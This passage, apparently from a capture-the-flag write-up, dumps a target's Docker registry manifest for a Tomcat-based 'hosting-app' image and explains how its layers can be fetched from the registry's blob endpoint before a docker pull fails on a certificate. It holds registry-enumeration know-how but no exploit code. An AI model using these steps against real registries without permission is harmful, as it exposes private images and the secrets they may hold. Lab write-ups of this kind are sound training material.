         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:5de5f69f42d765af6ffb6753242b18dd4a33602ad7d76df52064833e5c527cb4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:ff3a5c916c92643ff77519ffa742d3ec61b7f591b6b7504599d95a4a41134e28"
      }
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"app\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/tomcat/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin\",\"LANG=C.UTF-8\",\"JAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jre\",\"JAVA_VERSION=8u151\",\"JAVA_ALPINE_VERSION=8.151.12-r0\",\"CATALINA_HOME=/usr/local/tomcat\",\"TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib\",\"LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\",\"GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23\",\"TOMCAT_MAJOR=9\",\"TOMCAT_VERSION=9.0.2\",\"TOMCAT_SHA1=b59e1d658a4edbca7a81d12fd6f20203a4da9743\",\"TOMCAT_TGZ_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz\",\"TOMCAT_ASC_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc\"],\"Cmd\":[\"catalina.sh\",\"run\"],\"Image\":\"sha256:57f3a04ba3229928a30942945b0fb3c74bd61cec80cbc5a41d7d61a2d1c3ec4f\",\"Volumes\":null,\"WorkingDir\":\"/usr/local/tomcat\",\"Entrypoint\":null,\"OnBuild\":[],\"Labels\":null},\"container\":\"2f8f037b0e059fa89bc318719f991b783cd3c4b92de4a6776cc5ec3a8530d6ba\",\"container_config\":{\"Hostname\":\"2f8f037b0e05\",\"Domainname\":\"\",\"User\":\"app\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/tomcat/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin\",\"LANG=C.UTF-8\",\"JAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jre\",\"JAVA_VERSION=8u151\",\"JAVA_ALPINE_VERSION=8.151.12-r0\",\"CATALINA_HOME=/usr/local/tomcat\",\"TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib\",\"LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\",\"GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23\",\"TOMCAT_MAJOR=9\",\"TOMCAT_VERSION=9.0.2\",\"TOMCAT_SHA1=b59e1d658a4edbca7a81d12fd6f20203a4da9743\",\"TOMCAT_TGZ_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz\",\"TOMCAT_ASC_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"#(nop) \",\"CMD [\\\"catalina.sh\\\" \\\"run\\\"]\"],\"Image\":\"sha256:57f3a04ba3229928a30942945b0fb3c74bd61cec80cbc5a41d7d61a2d1c3ec4f\",\"Volumes\":null,\"WorkingDir\":\"/usr/local/tomcat\",\"Entrypoint\":null,\"OnBuild\":[],\"Labels\":{}},\"created\":\"2023-07-04T10:57:03.768956926Z\",\"docker_version\":\"20.10.23\",\"id\":\"1f5797acb3ce332a92212fac43141b9179f396db844876ea976828c027cc5cd2\",\"os\":\"linux\",\"parent\":\"b581fd7323f8b829979a384105c27aeff6f114f0b5e63aaa00e4090ce50df370\",\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"b581fd7323f8b829979a384105c27aeff6f114f0b5e63aaa00e4090ce50df370\",\"parent\":\"1c287aa55678a4fa6681ba16d09ce6bf798fac6640dceb43230e18a04316aee1\",\"created\":\"2023-07-04T10:57:03.500684978Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  USER app\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"1c287aa55678a4fa6681ba16d09ce6bf798fac6640dceb43230e18a04316aee1\",\"parent\":\"c5b60d48ea6e9578b52142829c5a979f0429207c7ff107f556c73b2d00230ba2\",\"created\":\"2023-07-04T10:57:03.230181852Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY --chown=app:appfile:24e216b758a41629b4357c4cd3aa1676635e7f68b432edff5124a8af4b95362f in /etc/hosting.ini \"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"c5b60d48ea6e9578b52142829c5a979f0429207c7ff107f556c73b2d00230ba2\",\"parent\":\"8352728bd14b4f5a18051ae76ce15e3d3a97180d5a699b3847d89570e37354f1\",\"created\":\"2023-07-04T10:57:02.865658784Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c chown -R app /usr/local/tomcat/\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"8352728bd14b4f5a18051ae76ce15e3d3a97180d5a699b3847d89570e37354f1\",\"parent\":\"a785065e8f19dad061ddf5035668d11bc69cd943634130ffd35ab8fcd9884da0\",\"created\":\"2023-07-04T10:56:56.087876543Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c adduser -S -u 1000 -G app app\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"a785065e8f19dad061ddf5035668d11bc69cd943634130ffd35ab8fcd9884da0\",\"parent\":\"690545aba874c1cbffa3b6cfa0b6708cffb39c97d4b823b4cef4abd0db23cce0\",\"created\":\"2023-07-04T10:56:55.215778789Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c addgroup -S -g 1000 app\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"690545aba874c1cbffa3b6cfa0b6708cffb39c97d4b823b4cef4abd0db23cce0\",\"parent\":\"a133674c237f389cb7d5e0c12177d5a7f3dcc3f068f6e92561f5898835c827d6\",\"created\":\"2023-07-04T10:56:54.346382505Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY file:c7945822095fe4c2530de4cf6bf7c729cbe6af014740a937187ab5d2e35c30f6 in /usr/local/tomcat/webapps/hosting.war \"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"a133674c237f389cb7d5e0c12177d5a7f3dcc3f068f6e92561f5898835c827d6\",\"parent\":\"57f5a3c239ecc33903be4eabc571b72d8d934124b84dc6bdffb476845a9af610\",\"created\":\"2023-07-04T10:56:53.888849151Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY file:9fd68c3bdf49b0400fb5ecb77c7ac57ae96f83db385b6231feb7649f7daa5c23 in /usr/local/tomcat/conf/context.xml \"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"57f5a3c239ecc33903be4eabc571b72d8d934124b84dc6bdffb476845a9af610\",\"parent\":\"b01f09ef77c3df66690a924577eabb8ed7043baeaa37a1b608370d0489e4fdee\",\"created\":\"2023-07-04T10:56:53.629058758Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c rm -rf /usr/local/tomcat/webapps/ROOT\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"b01f09ef77c3df66690a924577eabb8ed7043baeaa37a1b608370d0489e4fdee\",\"parent\":\"80e769c3cd6d9be2bcfea77a058c23d7ea112afaddce9e12c8eebf6d759923fe\",\"created\":\"2018-01-10T09:34:07.981925046Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"catalina.sh\\\" \\\"run\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"80e769c3cd6d9be2bcfea77a058c23d7ea112afaddce9e12c8eebf6d759923fe\",\"parent\":\"f5f0aebde7367c572f72c6d19cbea5b9b039b281b5e140bcd1a9b30ebc4883ce\",\"created\":\"2018-01-10T09:34:07.723478629Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  EXPOSE 8080/tcp\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"f5f0aebde7367c572f72c6d19cbea5b9b039b281b5e140bcd1a9b30ebc4883ce\",\"parent\":\"7aa3546803b6195a9839f57454a9d61a490e5e5f921b65b7ce9883615a7fef76\",\"created\":\"2018-01-10T09:34:07.47548453Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -e \\t\\u0026\\u0026 nativeLines=\\\"$(catalina.sh configtest 2\\u003e\\u00261)\\\" \\t\\u0026\\u0026 nativeLines=\\\"$(echo \\\"$nativeLines\\\" | grep 'Apache Tomcat Native')\\\" \\t\\u0026\\u0026 nativeLines=\\\"$(echo \\\"$nativeLines\\\" | sort -u)\\\" \\t\\u0026\\u0026 if ! echo \\\"$nativeLines\\\" | grep 'INFO: Loaded APR based Apache Tomcat Native library' \\u003e\\u00262; then \\t\\techo \\u003e\\u00262 \\\"$nativeLines\\\"; \\t\\texit 1; \\tfi\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"7aa3546803b6195a9839f57454a9d61a490e5e5f921b65b7ce9883615a7fef76\",\"parent\":\"c23e626ece757750f0686befb692e52700626071dcd62c9b7424740c3683a842\",\"created\":\"2018-01-10T09:33:57.030831358Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -eux; \\t\\tapk add --no-cache --virtual .fetch-deps \\t\\tca-certificates \\t\\topenssl \\t; \\t\\tsuccess=; \\tfor url in $TOMCAT_TGZ_URLS; do \\t\\tif wget -O tomcat.tar.gz \\\"$url\\\"; then \\t\\t\\tsuccess=1; \\t\\t\\tbreak; \\t\\tfi; \\tdone; \\t[ -n \\\"$success\\\" ]; \\t\\techo \\\"$TOMCAT_SHA1 *tomcat.tar.gz\\\" | sha1sum -c -; \\t\\tsuccess=; \\tfor url in $TOMCAT_ASC_URLS; do \\t\\tif wget -O tomcat.tar.gz.asc \\\"$url\\\"; then \\t\\t\\tsuccess=1; \\t\\t\\tbreak; \\t\\tfi; \\tdone; \\t[ -n \\\"$success\\\" ]; \\t\\tgpg --batch --verify tomcat.tar.gz.asc tomcat.tar.gz; \\ttar -xvf tomcat.tar.gz --strip-components=1; \\trm bin/*.bat; \\trm tomcat.tar.gz*; \\t\\tnativeBuildDir=\\\"$(mktemp -d)\\\"; \\ttar -xvf bin/tomcat-native.tar.gz -C \\\"$nativeBuildDir\\\" --strip-components=1; \\tapk add --no-cache --virtual .native-build-deps \\t\\tapr-dev \\t\\tcoreutils \\t\\tdpkg-dev dpkg \\t\\tgcc \\t\\tlibc-dev \\t\\tmake \\t\\t\\\"openjdk${JAVA_VERSION%%[-~bu]*}\\\"=\\\"$JAVA_ALPINE_VERSION\\\" \\t\\topenssl-dev \\t; \\t( \\t\\texport CATALINA_HOME=\\\"$PWD\\\"; \\t\\tcd \\\"$nativeBuildDir/native\\\"; \\t\\tgnuArch=\\\"$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)\\\"; \\t\\t./configure \\t\\t\\t--build=\\\"$gnuArch\\\" \\t\\t\\t--libdir=\\\"$TOMCAT_NATIVE_LIBDIR\\\" \\t\\t\\t--prefix=\\\"$CATALINA_HOME\\\" \\t\\t\\t--with-apr=\\\"$(which apr-1-config)\\\" \\t\\t\\t--with-java-home=\\\"$(docker-java-home)\\\" \\t\\t\\t--with-ssl=yes; \\t\\tmake -j \\\"$(nproc)\\\"; \\t\\tmake install; \\t); \\trunDeps=\\\"$( \\t\\tscanelf --needed --nobanner --format '%n#p' --recursive \\\"$TOMCAT_NATIVE_LIBDIR\\\" \\t\\t\\t| tr ',' '\\\\n' \\t\\t\\t| sort -u \\t\\t\\t| awk 'system(\\\"[ -e /usr/local/lib/\\\" $1 \\\" ]\\\") == 0 { next } { print \\\"so:\\\" $1 }' \\t)\\\"; \\tapk add --virtual .tomcat-native-rundeps $runDeps; \\tapk del .fetch-deps .native-build-deps; \\trm -rf \\\"$nativeBuildDir\\\"; \\trm bin/tomcat-native.tar.gz; \\t\\tapk add --no-cache bash; \\tfind ./bin/ -name '*.sh' -exec sed -ri 's|^#!/bin/sh$|#!/usr/bin/env bash|' '{}' +\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"c23e626ece757750f0686befb692e52700626071dcd62c9b7424740c3683a842\",\"parent\":\"ba737ee0cd9073e2003dbc41ebaa4ac347a9da8713ee3cdd18c9099c71d715d7\",\"created\":\"2018-01-10T09:33:33.620084689Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_ASC_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"ba737ee0cd9073e2003dbc41ebaa4ac347a9da8713ee3cdd18c9099c71d715d7\",\"parent\":\"67f844d01db77d9e5e9bdc5c154a8d40bdfe8ec30f2c0aa6c199448aab75f94e\",\"created\":\"2018-01-10T09:33:33.366948345Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_TGZ_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"67f844d01db77d9e5e9bdc5c154a8d40bdfe8ec30f2c0aa6c199448aab75f94e\",\"parent\":\"61e9c45c309801f541720bb694574780aaf3f9c9ba939afd3a2248f921257e2b\",\"created\":\"2018-01-10T09:33:33.130789837Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_SHA1=b59e1d658a4edbca7a81d12fd6f20203a4da9743\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"61e9c45c309801f541720bb694574780aaf3f9c9ba939afd3a2248f921257e2b\",\"parent\":\"7aa678f161898c0b2fb24800833ec8a88e29662a4aeb73d9fd09f0f3e2880638\",\"created\":\"2018-01-10T09:33:32.902199138Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_VERSION=9.0.2\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"7aa678f161898c0b2fb24800833ec8a88e29662a4aeb73d9fd09f0f3e2880638\",\"parent\":\"d436c875c4061e0058d744bb26561bc738cba69b135416d441401faeb47b558c\",\"created\":\"2018-01-10T09:33:32.656603152Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_MAJOR=9\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"d436c875c4061e0058d744bb26561bc738cba69b135416d441401faeb47b558c\",\"parent\":\"15ee0d244e69dcb1e0ff2817e31071a18a7352ae4e5bb1765536a831bf69ecfc\",\"created\":\"2018-01-10T09:33:29.658955433Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -ex; \\tfor key in $GPG_KEYS; do \\t\\tgpg --keyserver ha.pool.sks-keyservers.net --recv-keys \\\"$key\\\"; \\tdone\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"15ee0d244e69dcb1e0ff2817e31071a18a7352ae4e5bb1765536a831bf69ecfc\",\"parent\":\"ff0264281c2fadd4108ccac96ddce82587bc26666b918f31bcb43b7ef73c65e8\",\"created\":\"2018-01-10T09:33:20.722817917Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"ff0264281c2fadd4108ccac96ddce82587bc26666b918f31bcb43b7ef73c65e8\",\"parent\":\"4d9c918fda475437138013a0cf2e0c9086e7c1ed8190c1a0cef8d2b882937428\",\"created\":\"2018-01-10T09:29:11.265649726Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c apk add --no-cache gnupg\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"4d9c918fda475437138013a0cf2e0c9086e7c1ed8190c1a0cef8d2b882937428\",\"parent\":\"7577bdb4d1f873242bef6582d26031cdea0a64cccf8f8608a8c07cb3cc74611e\",\"created\":\"2018-01-10T09:29:07.609109611Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"7577bdb4d1f873242bef6582d26031cdea0a64cccf8f8608a8c07cb3cc74611e\",\"parent\":\"839af1242b7dcef37994affedfee3e2c52246e521ac101e703737fc0164cdf5c\",\"created\":\"2018-01-10T09:29:07.376174727Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"839af1242b7dcef37994affedfee3e2c52246e521ac101e703737fc0164cdf5c\",\"parent\":\"ea6f6f5cf5c076bca613117419ab5c2d591798dc146fa25b1ab5f77dadf35a0c\",\"created\":\"2018-01-10T09:29:07.155029096Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) WORKDIR /usr/local/tomcat\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"ea6f6f5cf5c076bca613117419ab5c2d591798dc146fa25b1ab5f77dadf35a0c\",\"parent\":\"c55835e0e7564582d31203616f363dfb303cab260c1a6dec9a2a0329a8e27b81\",\"created\":\"2018-01-10T09:29:06.890891119Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c mkdir -p \\\"$CATALINA_HOME\\\"\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"c55835e0e7564582d31203616f363dfb303cab260c1a6dec9a2a0329a8e27b81\",\"parent\":\"32c57341ccdca27052b71277715b86f2c0ad436ac493bb79467a8df664379ba9\",\"created\":\"2018-01-10T09:29:06.087097667Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV PATH=/usr/local/tomcat/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"32c57341ccdca27052b71277715b86f2c0ad436ac493bb79467a8df664379ba9\",\"parent\":\"c54559a23f245bd25ad627150eaadb1e99a60811ad2955e6a747f2a59b09b22b\",\"created\":\"2018-01-10T09:29:05.864118034Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV CATALINA_HOME=/usr/local/tomcat\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"c54559a23f245bd25ad627150eaadb1e99a60811ad2955e6a747f2a59b09b22b\",\"parent\":\"86a2c94b64bc779ec79acaa9f0ab00dff4a664d23f7546330a3165f1137cd596\",\"created\":\"2018-01-10T04:52:04.664605562Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -x \\t\\u0026\\u0026 apk add --no-cache \\t\\topenjdk8-jre=\\\"$JAVA_ALPINE_VERSION\\\" \\t\\u0026\\u0026 [ \\\"$JAVA_HOME\\\" = \\\"$(docker-java-home)\\\" ]\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"86a2c94b64bc779ec79acaa9f0ab00dff4a664d23f7546330a3165f1137cd596\",\"parent\":\"8ad7d8482d05498820d3256b0ba7eeaf21b8e7ab63044a4bce65116a5dac6a49\",\"created\":\"2018-01-10T04:51:57.540527702Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV JAVA_ALPINE_VERSION=8.151.12-r0\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"8ad7d8482d05498820d3256b0ba7eeaf21b8e7ab63044a4bce65116a5dac6a49\",\"parent\":\"55332c2663c5991fc04851d7980056a37cf2d703e90ef658fd8adccd947f5ca1\",\"created\":\"2018-01-10T04:51:57.314525921Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV JAVA_VERSION=8u151\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"55332c2663c5991fc04851d7980056a37cf2d703e90ef658fd8adccd947f5ca1\",\"parent\":\"3f24ff911184223f9c7e0b260cce136bc9cededdbdce79112e2a84e4c34bb568\",\"created\":\"2018-01-10T04:51:57.072315887Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"3f24ff911184223f9c7e0b260cce136bc9cededdbdce79112e2a84e4c34bb568\",\"parent\":\"0ed181ef14afa5947383aaa2644e5ece84fb1a70f3156708709f2d04b6a6ec9e\",\"created\":\"2018-01-10T04:51:56.850972184Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV JAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jre\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"0ed181ef14afa5947383aaa2644e5ece84fb1a70f3156708709f2d04b6a6ec9e\",\"parent\":\"5a545e9783766d38b2d99784c9d9bf5ed547bf48e1a293059b4cc7f27dd34b31\",\"created\":\"2018-01-10T04:48:25.431215554Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c { \\t\\techo '#!/bin/sh'; \\t\\techo 'set -e'; \\t\\techo; \\t\\techo 'dirname \\\"$(dirname \\\"$(readlink -f \\\"$(which javac || which java)\\\")\\\")\\\"'; \\t} \\u003e /usr/local/bin/docker-java-home \\t\\u0026\\u0026 chmod +x /usr/local/bin/docker-java-home\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"5a545e9783766d38b2d99784c9d9bf5ed547bf48e1a293059b4cc7f27dd34b31\",\"parent\":\"2dea27bce7d674e8140e0378fe5a51157011109d9da593bab1ecf86c93595292\",\"created\":\"2018-01-10T04:48:24.510692074Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV LANG=C.UTF-8\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"2dea27bce7d674e8140e0378fe5a51157011109d9da593bab1ecf86c93595292\",\"parent\":\"28a0c8bbcab32237452c3dadfb8302a6fab4f6064be2d858add06a7be8c32924\",\"created\":\"2018-01-09T21:10:58.579708634Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/sh\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"28a0c8bbcab32237452c3dadfb8302a6fab4f6064be2d858add06a7be8c32924\",\"created\":\"2018-01-09T21:10:58.365737589Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:093f0723fa46f6cdbd6f7bd146448bb70ecce54254c35701feeceb956414622f in / \"]}}"
      }
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "DBHZ:D6NK:J5GS:GEVJ:BWFA:4NJI:YQBD:KXGX:473R:INFC:IXXE:L4I7",
               "kty": "EC",
               "x": "QAwE4s7YC2ERVKhnsAKWw-_-eZ02Gq_hFZg-HnS4CKI",
               "y": "TJbTTepB1svg01bhwejAvUx4udrM8t0TJLbjyoAP4PY"
            },
            "alg": "ES256"
         },
         "signature": "P35ij5ZzA5u0HV4T9h4yRluf0Sj_E2-E5GbsX1UNjA9ZzYPXFmw5MKLYZWm0UrhlVmfb5-0M5icrewFri1NTNA",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjI2MDkxLCJmb3JtYXRUYWlsIjoiQ24wIiwidGltZSI6IjIwMjQtMDEtMjdUMTY6MTI6MDNaIn0"
      }
   ]
}

```

There’s a *ton* here. The top has a key, `fsLayers`, which is a list of `blobSum` objects which are sha256 hashes. Each of these represents a commit to the image and contains some parts of the file system as a diff from the previous. They can be downloaded from `/v2/[repository]/blobs/sha256:[hash]`.

Still, there’s no reason to manually do this.

#### Get Image - Via docker

If I try to fetch the image with `docker`, it complains of untrusted certificates:

```

oxdf@hacky$ docker pull webhosting.htb:5000/hosting-app:latest
Error response from daemon: Get "https://webhosting.htb:5000/v2/": tls: failed to verify certificate: x509: certificate signed by unknown authority

```

I’ll fetch the certificate with `openssl`:

```

